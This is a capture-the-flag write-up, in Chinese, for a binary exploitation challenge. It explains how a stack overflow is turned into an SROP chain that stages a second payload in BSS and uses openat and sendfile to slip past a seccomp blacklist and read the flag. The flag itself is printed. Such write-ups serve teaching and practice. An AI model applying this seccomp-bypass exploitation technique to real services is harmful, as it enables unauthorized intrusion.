# L3akCTF 2024 pors Writeup

## 题目简述

程序关闭 PIE 和 stack protector，在 0x20 字节栈缓冲区中读取 0x250 字节：

```c
char buf[0x20];
syscall(SYS_read, 0, buf, 0x250);
```

seccomp 默认允许，只显式杀死：

```text
open, execve, execveat, mmap, write
```

二进制 gadget 很少，但包含人为加入的 `pop rdi; ret`，并导入了 libc 的 `syscall()` 包装函数。可以用 SROP 恢复完整寄存器现场，先把后续链读入 BSS，再用未封禁的 `openat + sendfile` 读取 flag。

## 解题过程

### 1. 触发 rt_sigreturn

覆盖到返回地址的偏移是 `0x28`。利用链中的 `syscall` 地址是 `syscall@plt`，对应 C 接口：

```c
long syscall(long number, ...);
```

因此先令 RDI 为 15，即 `SYS_rt_sigreturn`：

```python
trigger = flat(
    pop_rdi,
    constants.SYS_rt_sigreturn,
    syscall_plt,
)
```

这与直接跳到裸 `syscall` 指令不同：后续真正调用系统调用时，寄存器按 libc 函数参数布局设置，系统调用号仍放 RDI，第一至第四参数依次放 RSI、RDX、RCX、R8。

### 2. 第一帧把第二阶段读入 BSS

首个伪造信号帧恢复为：

```text
RDI = SYS_read
RSI = 0
RDX = bss
RCX = 0x800
RIP = syscall@plt
RSP = bss + 0x10
```

等价于：

```c
syscall(SYS_read, 0, bss, 0x800);
```

第一阶段 payload 为：

```python
payload = b"A" * 0x28 + trigger + bytes(read_frame)
```

发送后稍作同步，再发送原始第二阶段数据。

### 3. openat 与 sendfile 绕过过滤

BSS 开头写入：

```text
flag.txt\x00
```

随后依次放置 `trigger + SigreturnFrame`。第一帧执行：

```c
syscall(SYS_openat, AT_FDCWD, "flag.txt", 0);
```

对应寄存器为：

```text
RDI = SYS_openat
RSI = -100          # AT_FDCWD
RDX = flag_addr
RCX = 0
```

假设返回的文件描述符为 3，下一帧执行：

```c
syscall(SYS_sendfile, 2, 3, NULL, 0x400);
```

`sendfile` 在内核中直接把文件内容复制到 stderr，不会调用被 seccomp 禁止的 `write`。其寄存器布局是：

```text
RDI = SYS_sendfile
RSI = 2
RDX = 3
RCX = 0
R8  = 0x400
```

每个信号帧把 RSP 指向下一组 `pop rdi; 15; syscall@plt`，从而连续触发下一次 `rt_sigreturn`。最后再构造 `exit` 帧干净退出。服务回显：

```text
L3AK{sr0p_4nd_m0viing_4nd_G3T_wh4t_u_r34lly_w4nt}
```

## 方法总结

- seccomp 黑名单必须按“允许了什么”审计。禁用 `open` 和 `write` 并不能覆盖同功能的 `openat` 与 `sendfile`。
- SROP 适合 gadget 稀缺但存在系统调用入口的二进制，可一次控制几乎全部寄存器和栈指针。
- 使用 libc `syscall()` 包装函数时，伪造帧应遵循普通函数调用 ABI；若跳到裸 `syscall` 指令，则应把系统调用号放 RAX。混淆这两种入口会导致整条链错位。
